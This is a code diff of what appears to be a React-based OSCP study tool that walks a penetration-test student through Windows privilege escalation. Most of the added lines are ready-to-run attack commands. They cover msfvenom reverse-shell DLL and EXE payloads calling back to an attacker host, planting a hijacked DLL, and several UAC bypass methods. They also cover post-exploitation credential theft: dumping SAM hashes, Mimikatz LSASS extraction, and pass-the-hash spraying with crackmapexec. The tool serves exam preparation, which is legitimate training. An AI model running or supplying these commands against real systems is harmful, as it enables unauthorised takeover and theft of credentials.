+# Or msfvenom:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o TextShaping.dll
+
+# ── STEP 4: PLANT THE DLL ─────────────────────────────
+# Transfer and place in application directory
+iwr http://$LHOST/TextShaping.dll -OutFile "C:\FileZilla\FileZilla FTP Client\TextShaping.dll"
+
+# ── STEP 5: TRIGGER ───────────────────────────────────
+# Option A: Restart the service
+sc stop VulnService
+sc start VulnService
+
+# Option B: Wait for privileged user to run the app
+# If a high-priv user runs the app it loads our DLL with their privileges
+net user  # check periodically for new admin user
+
+# Option C: Reboot (if Auto service + SeShutdownPrivilege)
+shutdown /r /t 0
+
+# ── STEP 6: VERIFY ────────────────────────────────────
+net user
+net localgroup administrators
+
+# ── PATH DLL HIJACK ───────────────────────────────────
+# If a binary in PATH calls LoadLibrary("missing.dll"):
+# Find writable PATH dirs
+echo %PATH%
+# Drop DLL in first writable dir before System32`,
+    warn: "64-bit process needs 64-bit DLL — msfvenom defaults to 32-bit, use windows/x64 explicitly. The DLL runs with the privileges of whoever launches the application — wait for a high-priv user if needed.",
     choices: [
-      { label: "DLL loaded — SYSTEM shell", next: "got_root_windows" },
-      { label: "Cannot restart service — try UAC bypass", next: "win_uac_bypass" },
+      { label: "DLL loaded — got shell/new admin", next: "got_root_windows" },
+      { label: "Cannot restart service — wait or reboot", next: "persistence" },
+      { label: "No writable service dir — try unquoted path", next: "unquoted_service" },
     ],
   },
+
 
   win_uac_bypass: {
     phase: "WINDOWS",
     title: "UAC Bypass — Medium to High Integrity",
-    body: "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership — check first.",
+    body: "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership. Reference: MITRE T1548.002, LOLBAS Project (lolbas-project.github.io).",
     cmd: `# -- CONFIRM UAC IS THE ISSUE -------------
 whoami /groups | findstr /i "mandatory\|integrity"
 # Medium Mandatory Level = UAC restricting you
@@ -5691,10 +6300,38 @@ Start-Process "C:\Windows\System32\eventvwr.exe"
 # Requires crafted .inf file
 # Reference: MITRE T1218.003
 
-# -- METHOD 4: UACME ----------------------
+# -- METHOD 4: ISCSICPL.EXE (reliable, Win 10/11) -----
+# iscsicpl.exe is auto-elevated — hijack via PATH
+# Step 1: create payload on Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o iscsicpl.exe
+
+# Step 2: create writable dir, drop fake binary
+mkdir C:\\Windows\\Temp\\uac
+iwr http://$LHOST/iscsicpl.exe -OutFile C:\\Windows\\Temp\\uac\\iscsicpl.exe
+Unblock-File C:\\Windows\\Temp\\uac\\iscsicpl.exe
+
+# Step 3: prepend dir to PATH for this session
+$env:PATH = "C:\\Windows\\Temp\\uac;" + $env:PATH
+
+# Step 4: launch iscsicpl — auto-elevates and finds
+# your fake binary first in PATH
+Start-Process iscsicpl
+
+# -- METHOD 5: CONFIGURATION MANAGER (GUI/RDP) ----------
+# If you have RDP access:
+# 1. Win+R -> type: msconfig -> Enter
+# 2. UAC prompt appears — click Show Details
+# 3. In the msconfig window: Tools tab
+# 4. Select "Command Prompt" -> click Launch
+# 5. This cmd runs at HIGH integrity — no prompt!
+# Alternative: Win+R -> eventvwr -> File -> Run task
+#   as administrator — browse to cmd.exe
+
+# -- METHOD 6: UACME ----------------------
 # 60+ bypass methods, regularly updated
-# Transfer UACMe.exe — run with method number
-.\Akagi64.exe 33 C:\Windows\Temp\shell.exe
+# github.com/hfiref0x/UACME
+.\\Akagi64.exe 33 C:\\Windows\\Temp\\shell.exe
+.\\Akagi64.exe 61 C:\\Windows\\Temp\\shell.exe
 
 # -- LISTENER -----------------------------
 nc -nlvp $LPORT`,
@@ -5714,6 +6351,21 @@ nc -nlvp $LPORT`,
 hostname
 ipconfig /all
 type C:\\Users\\Administrator\\Desktop\\proof.txt
+
+# ── POST-SYSTEM ACTIONS ──────────────────────────────
+# Dump hashes immediately
+reg save HKLM\\SAM C:\\Windows\\Temp\\sam
+reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
+impacket-secretsdump -sam sam -system system local
+
+# Mimikatz — plaintext creds from LSASS
+iwr http://$LHOST/mimikatz.exe -OutFile C:\\Windows\\Temp\\m.exe
+.\\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Spray dumped hashes laterally
+crackmapexec smb $ip/24 -u Administrator -H NTLMHASH --shares
+crackmapexec smb $ip/24 -u Administrator -H NTLMHASH -x "whoami"
+
 
 # Screenshot checklist:
 # ✅ whoami showing SYSTEM or Administrator
@@ -6669,6 +7321,8 @@ export default function OSCPAdventure() {
     }
   };
 
+
+
   const [copiedMd, setCopiedMd] = useState(false);
 
   const copyObsidian = () => {
@@ -7007,7 +7661,8 @@ export default function OSCPAdventure() {
               </p>
 
               {/* Warning */}
-              {node.warn && (
+              
+            {node.warn && (
                 <div style={{
                   background: "#1a1200",
                   border: "1px solid #ffd16633",
@@ -7078,6 +7733,7 @@ export default function OSCPAdventure() {
                     >
                       {copiedMd ? "✓ vault" : "⟡ obsidian"}
                     </button>
+                    
                     </div>
                   </div>
                   <pre style={{
